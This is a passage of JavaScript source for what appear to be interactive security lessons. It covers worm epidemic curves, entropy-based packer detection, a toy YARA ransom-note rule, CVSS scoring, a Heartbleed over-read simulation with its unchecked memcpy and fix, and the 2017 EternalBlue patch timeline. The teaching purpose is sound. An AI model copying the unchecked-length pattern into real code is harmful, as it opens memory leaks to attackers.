      return fr.map(x => ({ ...x, q, hl: x.hl || [] }));
    },
    paint(z, f) {
      const col = z.col, g = z.g, H = new Set(f.hl);
      const U = { asha: [14, 60], ravi: [14, 170] }, R = { manager: [210, 30], accountant: [210, 130], employee: [210, 230] };
      const P = { 'approve expense': [430, 20], 'pay expense': [430, 72], 'read ledger': [430, 124], 'read wiki': [430, 176], 'submit expense': [430, 228] };
      D.line(g, 124, 82, 210, 52, col.line, 2); D.line(g, 124, 192, 210, 152, col.line, 2);
      D.line(g, 210, 52, 192, 52, col.ink2, 1.5, [4, 4]); D.line(g, 192, 52, 192, 252, col.ink2, 1.5, [4, 4]); D.arrow(g, 192, 252, 208, 252, col.ink2, 1.5); D.arrow(g, 275, 174, 275, 228, col.ink2, 1.5);
      D.text(g, 'inherits', 280, 206, { s: 10, b: true, c: col.ink2 });
      Object.entries(ROLES).forEach(([r, ps]) => ps.forEach(pp => D.line(g, R[r][0] + 130, R[r][1] + 22, P[pp][0], P[pp][1] + 18, H.has(r) && H.has(pp) ? col.cv : col.line, H.has(r) && H.has(pp) ? 3 : 1)));
      Object.entries(U).forEach(([u, [x, y]]) => cbox(z, x, y, 110, 44, u, { s: 13, b: true, fill: H.has(u) ? col.cv : col.surf, c: H.has(u) ? '#fff' : col.ink }));
      Object.entries(R).forEach(([r, [x, y]]) => cbox(z, x, y, 130, 44, r, { s: 13, b: true, fill: H.has(r) ? 'rgba(15,118,110,0.3)' : col.bg }));
      Object.entries(P).forEach(([pp, [x, y]]) => cbox(z, x, y, 156, 36, pp, { s: 12, b: true, mono: true, fill: H.has(pp) ? 'rgba(15,118,110,0.3)' : col.surf }));
      if (f.q === 'both' && f.st >= 2) D.line(g, 124, 82, 210, 152, col.red, 2.5, [6, 4]);
      if (f.done) cbox(z, 14, 306, 572, 28, f.ok ? 'allowed through the role' : f.q === 'both' ? 'refused: separation of duties' : 'denied: no role grants it', { s: 13, b: true, fill: f.ok ? col.green : col.red, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Network and Systems 3.1  Worm outbreak curves: SI and SIR models with a cleanup rate
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  trace('cyworm', {
    title: 'Worm outbreaks: the epidemic curve',
    sub: 'A scanning worm infects new hosts in proportion to infected × still vulnerable: dI/dt = β·I·S/N. Defenders clean hosts at rate γ. When R0 = β/γ is below 1 the outbreak dies out. Numbers based on SQL Slammer: 75000 hosts, doubling every 8.5 seconds.',
    W: 600, H: 340,
    params: [
      { k: 'dbl', label: 'Doubling time at the start', type: 'select', v: '8.5', opts: [['8.5', '8.5 s (Slammer, 2003)'], ['37', '37 minutes (Code Red, 2001)']] },
      { k: 'g', label: 'Cleanup rate γ (fraction of β)', type: 'select', v: '0', opts: [['0', 'none'], ['0.25', 'γ = β/4 (R0 = 4)'], ['1.25', 'γ = 1.25β (R0 = 0.8)']] }
    ],
    tips: [
      { t: 'Play Slammer with no cleanup. The S shaped curve passes 90% in under 3 minutes, faster than any human response.', play: true },
      { t: 'Set R0 = 4. Cleaning helps, but most hosts are still infected at some point. Patching before the outbreak is what really works.', set: { g: '0.25' }, play: true },
      { t: 'Set R0 = 0.8. Each infection causes less than one more on average, so the worm fizzles out.', set: { g: '1.25' }, play: true }
    ],
    frames(p) {
      const N = 75000, dblS = p.dbl === '8.5' ? 8.5 : 37 * 60, beta = Math.log(2) / dblS, gamma = beta * +p.g;
      const Tend = dblS * 30, steps = 3000, dt = Tend / steps;
      let S = N - 1, I = 1, R = 0; const pts = [[0, I, R]];
      for (let k = 1; k <= steps; k++) { const ni = beta * S * I / N * dt, nr = gamma * I * dt; S -= ni; I += ni - nr; R += nr; if (k % 30 === 0) pts.push([k * dt, I, R]); }
      const fmt = t => dblS < 60 ? `${Math.round(t)} s` : `${(t / 3600).toFixed(1)} h`;
      const fr = [{ st: 0, n: 1, say: `N = 75000 vulnerable hosts, one infected. β = ln 2 / ${p.dbl === '8.5' ? '8.5 s' : '37 min'}${gamma ? `, γ = ${p.g}β, R0 = ${(1 / +p.g).toFixed(1)}` : ', no cleanup'}.` }];
      [10, 25, 40, 55, 70, 85, 100].forEach(pc => {
        const n = Math.round(pts.length * pc / 100); const [t, i, r] = pts[n - 1];
        fr.push({ st: 1, n, say: `t = ${fmt(t)}: ${Math.round(i).toLocaleString('en')} infected now${gamma ? `, ${Math.round(r).toLocaleString('en')} cleaned` : ''} (${(100 * (i + r) / N).toFixed(1)}% ever infected).` });
      });
      const ever = (pts[pts.length - 1][1] + pts[pts.length - 1][2]) / N;
      fr.push({ st: 2, done: true, n: pts.length, ever, say: gamma === 0 ? `Nearly every vulnerable host is infected. Early growth is exponential, then it slows as vulnerable hosts run out, the logistic S curve. Slammer reached about 90% of vulnerable hosts in 10 minutes.` : +p.g > 1 ? `R0 &lt; 1: the outbreak dies out with only ${(ever * 100).toFixed(2)}% ever infected.` : `R0 = 4: ${(ever * 100).toFixed(0)}% are infected at some point. Cleanup lowers the peak but the real defence is having fewer vulnerable hosts before the worm arrives.` });
      return fr.map(x => ({ ...x, pts, N, Tend, fmt }));
    },
    paint(z, f) {
      const col = z.col, g = z.g, L = 50, R = 420, T = 20, B = 262;
      const X = t => L + t / f.Tend * (R - L), Y = v => B - v / f.N * (B - T);
      D.line(g, L, B, R, B, col.line, 1.5); D.line(g, L, T, L, B, col.line, 1.5);
      [0, 0.5, 1].forEach(v => D.text(g, `${v * 100}%`, L - 6, Y(v * f.N) + 4, { a: 'right', s: 9, c: col.ink2 }));
      D.text(g, `time (0 to ${f.fmt(f.Tend)})`, (L + R) / 2, B + 18, { a: 'center', s: 10, b: true, c: col.ink2 });
      const pts = f.pts.slice(0, f.n);
      for (let i = 1; i < pts.length; i++) {
        D.line(g, X(pts[i - 1][0]), Y(pts[i - 1][1]), X(pts[i][0]), Y(pts[i][1]), col.red, 2.5);
        D.line(g, X(pts[i - 1][0]), Y(pts[i - 1][2]), X(pts[i][0]), Y(pts[i][2]), col.green, 2);
        D.line(g, X(pts[i - 1][0]), Y(pts[i - 1][1] + pts[i - 1][2]), X(pts[i][0]), Y(pts[i][1] + pts[i][2]), col.ink2, 1.2, [4, 3]);
      }
      cbox(z, 440, 20, 146, 30, 'infected now', { s: 12, b: true, fill: 'rgba(225,29,72,0.2)' });
      cbox(z, 440, 56, 146, 30, 'cleaned', { s: 12, b: true, fill: 'rgba(22,163,74,0.2)' });
      cbox(z, 440, 92, 146, 30, 'ever infected (dashed)', { s: 11, b: true, fill: col.surf });
      if (f.done) cbox(z, 14, 306, 572, 28, `ever infected: ${(f.ever * 100).toFixed(1)}% of vulnerable hosts`, { s: 13, b: true, fill: f.ever > 0.5 ? col.red : col.cv, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Network and Systems 3.1  Byte histograms and Shannon entropy: spotting packed or encrypted data
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D, utf8 } = CYZ;
  const make = kind => {
    let seed = 7; const rnd = () => (seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648;
    if (kind === 'text') return utf8('Security is a process, not a product. Attackers look for the weakest link, so defenders must think in layers. '.repeat(12)).slice(0, 1024);
    if (kind === 'code') { const ops = [0x55, 0x48, 0x89, 0xe5, 0x8b, 0x45, 0xfc, 0x83, 0xc0, 0x01, 0xc3, 0x00, 0x00, 0xe8, 0x0f, 0x1f]; return Array.from({ length: 1024 }, () => ops[Math.floor(rnd() * rnd() * 16)]); }
    return Array.from({ length: 1024 }, () => Math.floor(rnd() * 256));
  };
  const H = a => { const c = new Array(256).fill(0); a.forEach(b => c[b]++); return -c.filter(Boolean).reduce((s, k) => s + k / a.length * Math.log2(k / a.length), 0); };
  trace('cyentropy', {
    title: 'Entropy: does this file look packed or encrypted?',
    sub: 'Shannon entropy H = −Σ p·log₂ p measures how evenly the 256 byte values are used. Text and normal code use few values often (low H). Compressed, packed or encrypted data uses all values almost equally (H near 8 bits per byte).',
    W: 600, H: 340,
    params: [
      { k: 'kind', label: 'Sample (1024 bytes)', type: 'select', v: 'text', opts: [['text', 'English text'], ['code', 'Machine code section'], ['enc', 'Encrypted or packed section']] }
    ],
    tips: [
      { t: 'Play English text. A few letters and the space dominate, so entropy is around 4 bits per byte.', play: true },
      { t: 'Choose an encrypted section. The histogram is flat and entropy is close to 8, which is why packers and ransomware stand out.', set: { kind: 'enc' }, play: true }
    ],
    frames(p) {
      const data = make(p.kind), c = new Array(16).fill(0); data.forEach(b => c[b >> 4]++);
      const e = H(data);
      const fr = [
        { st: 1, data, c, say: `The first bytes: ${data.slice(0, 12).map(b => b.toString(16).padStart(2, '0')).join(' ')} ... 1024 bytes in all.` },
        { st: 2, data, c, say: 'Count how often each byte value appears. The chart groups the 256 values into 16 bins of 16 values each.' },
        { st: 3, data, c, e, say: `H = &minus;&Sigma; p<sub>i</sub> log<sub>2</sub> p<sub>i</sub> over all 256 values = <b>${e.toFixed(2)}</b> bits per byte. The maximum is 8, when every value has p = 1/256.` },
        { st: 4, done: true, data, c, e, say: e > 7.2 ? 'Near 8: compressed, packed or encrypted. Malware packers hide code this way, and a burst of files rewritten at this entropy suggests ransomware. JPEG, ZIP and video are also high, so tools combine entropy with other signals.' : 'Well below 8: structured data. A section of a program that suddenly jumps to near 8 is a classic sign of a packer.' }
      ];
      return fr.map(x => ({ ...x, kind: p.kind }));
    },
    paint(z, f) {
      const col = z.col, g = z.g, L = 40, B = 250, W = 360, Hh = 200, mx = Math.max(...f.c);
      if (f.st >= 2) {
        D.line(g, L, B, L + W, B, col.line, 1.5);
        f.c.forEach((v, i) => { const h = v / mx * Hh; D.rect(g, L + i * (W / 16) + 2, B - h, W / 16 - 4, h, { fill: f.st >= 3 && f.e > 7.2 ? col.red : col.cv }); D.text(g, (i * 16).toString(16), L + i * (W / 16) + W / 32, B + 13, { a: 'center', s: 9, c: col.ink2 }); });
        D.text(g, 'byte value bins (hex)', L + W / 2, B + 28, { a: 'center', s: 10, b: true, c: col.ink2 });
      } else {
        for (let i = 0; i < 48; i++) cbox(z, 14 + (i % 12) * 48, 30 + Math.floor(i / 12) * 34, 44, 28, f.data[i].toString(16).padStart(2, '0'), { s: 12, b: true, mono: true, fill: col.surf });
      }
      if (f.st >= 3) {
        cbox(z, 430, 30, 156, 60, ['entropy', `${f.e.toFixed(2)} / 8`], { s: 15, b: true, fill: f.e > 7.2 ? 'rgba(225,29,72,0.2)' : 'rgba(15,118,110,0.2)' });
        D.rect(g, 430, 104, 156, 16, { fill: col.bg, stroke: col.line }); D.rect(g, 430, 104, 156 * f.e / 8, 16, { fill: f.e > 7.2 ? col.red : col.cv });
      }
      if (f.done) cbox(z, 14, 306, 572, 28, f.e > 7.2 ? 'high entropy: packed, compressed or encrypted' : 'low entropy: normal structured data', { s: 13, b: true, fill: f.e > 7.2 ? col.red : col.cv, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Network and Systems 3.1  A YARA style scan: strings, a condition, and a hash list, file by file
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  const FILES = [
    ['readme.txt', 'Thanks for installing. Docs at example.org', []],
    ['HOW_TO_RECOVER.txt', 'Your files have been encrypted. Pay in Bitcoin at abc.onion', ['$a', '$b', '$c']],
    ['crypto_news.html', 'Bitcoin price rises again', ['$b']],
    ['notes.txt', 'Read the .onion guide and buy bitcoin safely', ['$b', '$c']]
  ];
  trace('cyyara', {
    title: 'Signature scanning: a YARA style rule',
    sub: 'A rule names byte strings and a condition. The scanner checks each file and reports a match when the condition holds. Changing the condition trades missed detections for false alarms.',
    W: 600, H: 340,
    params: [
      { k: 'need', label: 'Condition', type: 'select', v: '2', opts: [['1', 'any of them'], ['2', '2 of them'], ['3', 'all of them']] }
    ],
    tips: [
      { t: 'Play "2 of them". The ransom note matches, but so does an innocent notes file that mentions bitcoin and .onion: a false positive.', play: true },
      { t: 'Choose "all of them". Only the ransom note matches. Stricter rules miss variants that change one string.', set: { need: '3' }, play: true },
      { t: 'Choose "any of them". Even the crypto news page matches. Loose rules flood analysts.', set: { need: '1' }, play: true }
    ],
    frames(p) {
      const need = +p.need, rows = [];
      const fr = [{ st: 0, rows: [], say: `Rule Toy_Ransom_Note: $a = "files have been encrypted", $b = "bitcoin", $c = ".onion" (case ignored). Condition: ${need === 1 ? 'any of them' : need === 3 ? 'all of them' : '2 of them'}.` }];
      FILES.forEach(([name, text, hits]) => {
        const m = hits.length >= need, bad = name === 'HOW_TO_RECOVER.txt';
        rows.push({ name, hits, m, bad });
        fr.push({ st: 1, rows: rows.slice(), say: `${name}: found ${hits.length ? hits.join(', ') : 'nothing'}. ${m ? (bad ? '<b>Match</b>, and it really is a ransom note.' : '<b>Match</b>, but this file is harmless: a false positive.') : (bad ? 'No match: a missed detection.' : 'No match.')}` });
      });
      const fp = rows.filter(r => r.m && !r.bad).length;
      fr.push({ st: 2, done: true, rows, fp, say: `${fp} false positive${fp === 1 ? '' : 's'}. Real rules combine distinctive strings, byte patterns, file size and structure (for example the file must start with MZ) to stay precise, and they are tested against large sets of clean files before use.` });
      return fr.map(x => ({ ...x, need }));
    },
    paint(z, f) {
      const col = z.col, g = z.g;
      ['$a encrypted', '$b bitcoin', '$c .onion'].forEach((t, i) => cbox(z, 14 + i * 150, 12, 140, 26, t, { s: 11, b: true, mono: true, fill: col.surf }));
      cbox(z, 470, 12, 116, 26, `need ${f.need}`, { s: 12, b: true, fill: col.bg });
      f.rows.forEach((r, i) => {
        const y = 52 + i * 60;
        cbox(z, 14, y, 190, 48, r.name, { s: 12, b: true, mono: true, fill: col.surf });
        ['$a', '$b', '$c'].forEach((s, j) => cbox(z, 214 + j * 64, y + 8, 56, 32, s, { s: 12, b: true, mono: true, fill: r.hits.includes(s) ? col.cv : col.bg, c: r.hits.includes(s) ? '#fff' : col.ink2 }));
        cbox(z, 410, y + 4, 176, 40, r.m ? (r.bad ? 'match (true)' : 'match (false alarm)') : (r.bad ? 'missed' : 'clean'), { s: 12, b: true, fill: r.m ? (r.bad ? col.red : col.orange) : r.bad ? col.ink2 : col.green, c: '#fff' });
      });
      if (f.done) cbox(z, 14, 306, 572, 28, f.fp ? `${f.fp} false alarm(s): rule too loose` : 'precise: only the ransom note matched', { s: 13, b: true, fill: f.fp ? col.orange : col.cv, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Network and Systems 3.2  CVSS v3.1 base score, step by step, for real vulnerabilities
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  const VEC = {
    log4shell: ['Log4Shell CVE-2021-44228', 'AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H'],
    heartbleed: ['Heartbleed CVE-2014-0160', 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N'],
    lpe: ['Local privilege escalation', 'AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H'],
    xss: ['Reflected XSS', 'AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N']
  };
  const Wt = { AV: { N: 0.85, A: 0.62, L: 0.55, P: 0.2 }, AC: { L: 0.77, H: 0.44 }, UI: { N: 0.85, R: 0.62 }, CIA: { H: 0.56, L: 0.22, N: 0 } };
  const roundup = x => { const i = Math.round(x * 100000); return i % 10000 === 0 ? i / 100000 : (Math.floor(i / 10000) + 1) / 10; };
  const sev = s => s === 0 ? 'None' : s < 4 ? 'Low' : s < 7 ? 'Medium' : s < 9 ? 'High' : 'Critical';
  trace('cycvss', {
    title: 'CVSS v3.1: from a vector string to a score',
    sub: 'A CVSS vector lists how a flaw is reached (attack vector, complexity, privileges, user interaction), whether it escapes its component (scope) and what it hurts (confidentiality, integrity, availability). Fixed formulas turn it into a score from 0 to 10.',
    W: 600, H: 340,
    params: [
      { k: 'v', label: 'Vulnerability', type: 'select', v: 'log4shell', opts: [['log4shell', 'Log4Shell (2021)'], ['heartbleed', 'Heartbleed (2014)'], ['lpe', 'Local privilege escalation'], ['xss', 'Reflected XSS']] }
    ],
    tips: [
      { t: 'Play Log4Shell. Every metric is at its worst and scope is changed, so it scores the maximum 10.0.', play: true },
      { t: 'Choose Heartbleed. It leaks secrets (C:H) but changes nothing (I:N, A:N), so it scores 7.5, High, even though its real impact was huge.', set: { v: 'heartbleed' }, play: true },
      { t: 'Choose reflected XSS. It needs a click (UI:R), and low impacts keep it at 6.1, Medium.', set: { v: 'xss' }, play: true }
    ],
    frames(p) {
      const [name, vec] = VEC[p.v];
      const m = Object.fromEntries(vec.split('/').map(x => x.split(':')));
      const ch = m.S === 'C';
      const pr = { N: 0.85, L: ch ? 0.68 : 0.62, H: ch ? 0.5 : 0.27 }[m.PR];
      const c = Wt.CIA[m.C], i = Wt.CIA[m.I], a = Wt.CIA[m.A];
      const iss = 1 - (1 - c) * (1 - i) * (1 - a);
      const imp = ch ? 7.52 * (iss - 0.029) - 3.25 * Math.pow(iss - 0.02, 15) : 6.42 * iss;
      const ex = 8.22 * Wt.AV[m.AV] * Wt.AC[m.AC] * pr * Wt.UI[m.UI];
      const raw = imp <= 0 ? 0 : ch ? Math.min(1.08 * (imp + ex), 10) : Math.min(imp + ex, 10);
      const base = imp <= 0 ? 0 : roundup(raw);
      const w = { AV: Wt.AV[m.AV], AC: Wt.AC[m.AC], PR: pr, UI: Wt.UI[m.UI], S: m.S, C: c, I: i, A: a };
      const fr = [
        { st: 1, say: `${name}. Vector CVSS:3.1/${vec}. Each letter is a metric and its value.` },
        { st: 2, say: `Look up the weights. Attack vector ${m.AV} = ${w.AV}, complexity ${m.AC} = ${w.AC}, privileges ${m.PR} = ${pr}${m.PR !== 'N' ? (ch ? ' (higher because scope is changed)' : '') : ''}, user interaction ${m.UI} = ${w.UI}. Impacts: C ${c}, I ${i}, A ${a}.` },
        { st: 3, say: `Impact sub score base: ISS = 1 &minus; (1 &minus; ${c})(1 &minus; ${i})(1 &minus; ${a}) = <b>${iss.toFixed(4)}</b>.` },
        { st: 4, say: ch ? `Scope changed, so Impact = 7.52 &times; (ISS &minus; 0.029) &minus; 3.25 &times; (ISS &minus; 0.02)<sup>15</sup> = <b>${imp.toFixed(4)}</b>.` : `Scope unchanged, so Impact = 6.42 &times; ISS = <b>${imp.toFixed(4)}</b>.` },
        { st: 5, say: `Exploitability = 8.22 &times; ${w.AV} &times; ${w.AC} &times; ${pr} &times; ${w.UI} = <b>${ex.toFixed(4)}</b>. Its maximum is 3.887, for a flaw anyone can reach over the network with no help.` },
        { st: 6, done: true, say: `Base = Roundup(min(${ch ? '1.08 &times; ' : ''}(Impact + Exploitability), 10)) = Roundup(${raw.toFixed(4)}) = <b>${base.toFixed(1)}</b>, ${sev(base)}. Roundup always goes up to one decimal place. The score says how bad the flaw is, not how likely it is to be used: that is EPSS and the KEV list.` }
      ];
      return fr.map(x => ({ ...x, name, vec, m, w, iss, imp, ex, base, ch }));
    },
    paint(z, f) {
      const col = z.col, g = z.g;
      cbox(z, 14, 10, 572, 30, `CVSS:3.1/${f.vec}`, { s: 13, b: true, mono: true, fill: col.surf });
      const keys = ['AV', 'AC', 'PR', 'UI', 'S', 'C', 'I', 'A'];
      keys.forEach((k, j) => {
        const x = 14 + j * 72;
        cbox(z, x, 50, 66, 44, [k, f.m[k]], { s: 13, b: true, mono: true, fill: ['C', 'I', 'A'].includes(k) ? 'rgba(225,29,72,0.12)' : k === 'S' ? 'rgba(234,88,12,0.15)' : 'rgba(15,118,110,0.12)' });
        if (f.st >= 2) cbox(z, x, 100, 66, 26, String(f.w[k]), { s: 12, b: true, mono: true, fill: col.bg });
      });
      const row = (y, label, val, on) => { if (!on) return; cbox(z, 14, y, 250, 34, label, { s: 12, b: true, fill: col.surf }); cbox(z, 270, y, 110, 34, val, { s: 14, b: true, mono: true, fill: col.bg }); };
      row(140, 'ISS (impact sub score)', f.iss.toFixed(4), f.st >= 3);
      row(182, f.ch ? 'Impact (scope changed)' : 'Impact = 6.42 × ISS', f.imp.toFixed(4), f.st >= 4);
      row(224, 'Exploitability', f.ex.toFixed(4), f.st >= 5);
      if (f.st >= 5) { D.rect(g, 400, 228, 186, 14, { fill: col.bg, stroke: col.line }); D.rect(g, 400, 228, 186 * f.ex / 3.887, 14, { fill: col.cv }); D.text(g, 'of max 3.887', 493, 256, { a: 'center', s: 10, c: col.ink2 }); }
      if (f.st >= 4) { D.rect(g, 400, 186, 186, 14, { fill: col.bg, stroke: col.line }); D.rect(g, 400, 186, 186 * Math.max(0, f.imp) / 6.05, 14, { fill: col.red }); }
      if (f.done) {
        const s = sev(f.base);
        cbox(z, 400, 132, 186, 44, [`${f.base.toFixed(1)}`, s], { s: 15, b: true, fill: s === 'Critical' ? col.red : s === 'High' ? col.orange : col.cv, c: '#fff' });
        cbox(z, 14, 306, 572, 28, `${f.name}: base score ${f.base.toFixed(1)} (${s})`, { s: 13, b: true, fill: s === 'Critical' || s === 'High' ? col.red : col.cv, c: '#fff' });
      }
    }
  });
})();

/* =====================================================================================================
   Network and Systems 3.2  Heartbleed: a reply that trusts the claimed length, and the one line fix
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  const MEM = 'HELLO|user=alice|pw=Tr0ub4dor|key=MIIEv|';
  trace('cyheartbleed', {
    title: 'Heartbleed: reading past the end of a buffer',
    sub: 'A TLS heartbeat says "here are some bytes and their length, send them back". OpenSSL 1.0.1 to 1.0.1f trusted the length without checking it against what really arrived, so it sent back whatever sat next in memory.',
    W: 600, H: 340,
    params: [
      { k: 'claim', label: 'Length the client claims', type: 'select', v: '30', opts: [['5', '5 (honest)'], ['30', '30 (lie)'], ['40', '40 (bigger lie)']] },
      { k: 'ver', label: 'Server', type: 'select', v: 'bug', opts: [['bug', 'OpenSSL 1.0.1f (buggy)'], ['fix', 'OpenSSL 1.0.1g (fixed)']] }
    ],
    tips: [
      { t: 'Play a lie of 30 against the buggy server. The reply carries a user name and password that were never part of the request.', play: true },
      { t: 'Switch to the fixed server. It compares the claimed length with the real one and silently drops the request.', set: { ver: 'fix' }, play: true },
      { t: 'Try an honest length of 5. Both servers answer normally, which is why the bug went unnoticed for two years.', set: { claim: '5', ver: 'bug' }, play: true }
    ],
    frames(p) {
      const claim = +p.claim, real = 5, fix = p.ver === 'fix';
      const drop = fix && claim > real;
      const fr = [
        { st: 1, say: 'Server memory. The client’s heartbeat payload is copied to the start of a buffer. Next to it, by chance, sit other data: a user name, a password, part of a private key.' },
        { st: 2, say: `The client sends payload "HELLO" (5 bytes) but writes ${claim} in the length field.${claim === real ? ' That is honest.' : ' That is a lie.'}` },
        { st: 3, drop, say: fix ? (drop ? `The fixed server checks: is ${claim} bigger than the ${real} bytes that arrived? Yes, so it discards the request. This check was the whole fix.` : `The fixed server checks: ${claim} is not bigger than ${real}, so it answers.`) : `The buggy server never checks. It prepares to copy ${claim} bytes, starting at the payload, with memcpy.` },
        { st: 4, done: true, drop, say: drop ? 'No reply, no leak. Heartbleed was found in 2014 by Neel Mehta at Google and by Codenomicon. About 17% of TLS servers were thought to be vulnerable, and many had to replace their certificates because keys may have leaked.' : claim > real ? `The reply holds ${claim} bytes: the 5 real ones plus ${claim - real} from neighbouring memory, including the password. The real length field was 16 bits, so up to 64 KB could leak per request, and attackers could ask again and again, leaving no log.` : 'An honest request gets the 5 bytes back. Nothing leaks.' }
      ];
      return fr.map(x => ({ ...x, claim, real, fix }));
    },
    paint(z, f) {
      const col = z.col, g = z.g, cw = 14, x0 = 14, y0 = 40;
      D.text(g, 'server memory (one cell per byte)', x0, 28, { s: 11, b: true, c: col.ink2 });
      [...MEM].forEach((ch, i) => {
        const inPay = i < f.real, read = f.st >= 4 && !f.drop && i < f.claim;
        const secret = i >= f.real;
        D.rect(g, x0 + i * cw, y0, cw - 1, 26, { fill: read ? (inPay ? col.cv : col.red) : inPay ? 'rgba(15,118,110,0.25)' : secret ? 'rgba(234,88,12,0.12)' : col.bg, stroke: col.line });
        D.text(g, ch, x0 + i * cw + cw / 2, y0 + 17, { a: 'center', s: 11, b: true, mono: true, c: read ? '#fff' : col.ink });
      });
      if (f.st >= 2) {
        cbox(z, 14, 90, 270, 54, ['heartbeat request', `payload "HELLO"  length = ${f.claim}`], { s: 12, b: true, mono: true, fill: f.claim > f.real ? 'rgba(225,29,72,0.15)' : col.surf });
        D.arrow(g, 150, 90, 60, 70, col.ink2, 2);
      }
      if (f.st >= 3) {
        cbox(z, 300, 90, 286, 54, f.fix ? ['if (claimed > real) drop;', f.drop ? 'check fails: request dropped' : 'check passes'] : ['memcpy(reply, payload, claimed);', 'no check on claimed'], { s: 12, b: true, mono: true, fill: f.fix ? 'rgba(15,118,110,0.2)' : 'rgba(225,29,72,0.15)' });
        if (!f.drop) { D.line(g, x0, 76, x0 + f.claim * cw, 76, col.orange, 3); D.text(g, `${f.claim} bytes`, x0 + f.claim * cw / 2, 86, { a: 'center', s: 10, b: true, c: col.orange }); }
      }
      if (f.st >= 4 && !f.drop) {
        const out = MEM.slice(0, f.claim);
        cbox(z, 14, 166, 572, 50, ['reply sent to the client', out], { s: 12, b: true, mono: true, fill: f.claim > f.real ? 'rgba(225,29,72,0.15)' : col.surf });
      }
      if (f.done) cbox(z, 14, 306, 572, 28, f.drop ? 'fixed: lying request discarded' : f.claim > f.real ? `leaked ${f.claim - f.real} bytes of other memory` : 'honest request: nothing leaked', { s: 13, b: true, fill: f.claim > f.real && !f.drop ? col.red : col.cv, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Network and Systems 3.2  The window of exposure: MS17-010, EternalBlue, WannaCry and NotPetya (2017)
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  const EV = [
    [0, 'Mar 14', 'Microsoft releases patch MS17-010', 'Patch MS17-010 released'],
    [31, 'Apr 14', 'Shadow Brokers leak the EternalBlue exploit', 'EternalBlue exploit leaked'],
    [59, 'May 12', 'WannaCry worm uses EternalBlue', 'WannaCry uses EternalBlue'],
    [105, 'Jun 27', 'NotPetya wiper uses EternalBlue', 'NotPetya uses EternalBlue']
  ];
  trace('cypatch', {
    title: 'The window of exposure: patch speed against real 2017 events',
    sub: 'A system is exposed from the moment an exploit exists until the patch is installed. In 2017 the patch for the SMB flaw came first, the public exploit a month later, and two of the most damaging attacks ever followed. How fast you patch decides which of them reach you.',
    W: 600, H: 340,
    params: [
      { k: 'p', label: 'Your organisation patches after', type: 'select', v: '90', opts: [['14', '14 days'], ['45', '45 days'], ['90', '90 days'], ['200', 'never got round to it']] }
    ],
    tips: [
      { t: 'Play a 90 day patch cycle, common in 2017. WannaCry arrives while you are still exposed.', play: true },
      { t: 'Choose 14 days. You were patched long before the exploit even leaked.', set: { p: '14' }, play: true },
      { t: 'Choose 45 days. You were patched before WannaCry, but for two weeks a public exploit existed for your systems.', set: { p: '45' }, play: true }
    ],
    frames(p) {
      const pd = +p.p, fr = [];
      fr.push({ st: 0, n: 0, say: 'Day 0 is 14 March 2017. The timeline runs to the end of June. Your patch day is marked in green.' });
      EV.forEach(([d, date, what], i) => {
        const hit = d >= 31 && d < pd;
        fr.push({ st: 1, n: i + 1, say: `Day ${d} (${date}): ${what}.${i === 0 ? ' From now on, attackers can also study the patch to find the bug.' : i === 1 ? (pd <= 31 ? ' You are already patched.' : ' Your window of exposure opens now.') : hit ? ' <b>You are still unpatched and get hit.</b>' : ' You are patched, so it passes you by.'}` });
      });
      const hits = EV.filter(([d]) => d >= 59 && d < pd).length;
      const win = Math.max(0, Math.min(pd, 200) - 31);
      fr.push({ st: 2, done: true, n: 4, hits, win, say: `Window of exposure: ${win} days${pd >= 200 ? ' and counting' : ''}. ${hits ? `You were hit by ${hits} attack${hits > 1 ? 's' : ''}.` : 'No attack reached you.'} WannaCry hit more than 200000 computers, and many were Windows machines left unpatched for two months. CISA now asks US agencies to fix known exploited flaws within two weeks.` });
      return fr.map(x => ({ ...x, pd }));
    },
    paint(z, f) {
      const col = z.col, g = z.g, L = 30, R = 570, Y = 150, X = d => L + (R - L) * Math.min(d, 120) / 120;
      D.line(g, L, Y, R, Y, col.line, 2);
      [0, 30, 60, 90, 120].forEach(d => { D.line(g, X(d), Y - 4, X(d), Y + 4, col.line, 1.5); D.text(g, `day ${d}`, X(d), Y + 18, { a: 'center', s: 10, c: col.ink2 }); });
      if (f.n >= 2) { const e = Math.min(f.pd, 120); if (e > 31) D.rect(g, X(31), Y - 14, X(e) - X(31), 28, { fill: 'rgba(225,29,72,0.25)' }); }
      EV.slice(0, f.n).forEach(([d, date, what, short], i) => {
        const up = i % 2 === 0, hit = d >= 59 && d < f.pd;
        D.line(g, X(d), Y, X(d), up ? 60 : 220, hit ? col.red : col.ink2, 2);
        cbox(z, Math.max(14, Math.min(X(d) - 80, 426)), up ? 30 + (i === 2 ? 0 : 0) : 220, 160, 44, [date, short], { s: 10, b: true, fill: hit ? col.red : col.surf, c: hit ? '#fff' : col.ink });
      });
      if (f.st >= 0) { const xp = X(f.pd); if (f.pd <= 120) { D.line(g, xp, Y - 30, xp, Y + 30, col.green, 3); D.text(g, 'you patch', xp, Y + 42, { a: 'center', s: 11, b: true, c: col.green }); } else D.text(g, 'not patched by day 120', R - 4, Y - 22, { a: 'end', s: 11, b: true, c: col.red }); }
      if (f.done) cbox(z, 14, 306, 572, 28, `window of exposure ${f.win} days, ${f.hits ? f.hits + ' attack(s) hit you' : 'no attack reached you'}`, { s: 13, b: true, fill: f.hits ? col.red : col.cv, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Application Security 1.1  A session cookie and three attacks: sniffing, XSS theft and cross site requests
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
